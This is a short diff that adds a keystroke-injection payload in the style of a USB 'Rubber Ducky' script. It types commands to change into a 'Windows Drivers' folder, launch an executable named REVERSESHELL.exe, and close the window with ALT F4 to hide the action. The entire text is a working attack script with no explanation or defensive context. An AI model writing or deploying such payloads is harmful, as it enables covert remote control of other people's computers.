@@ -1,0 +1,5 @@
+STRING cd Windows Drivers
+ENTER
+STRING start REVERSESHELL.exe
+ENTER
+ALT f4
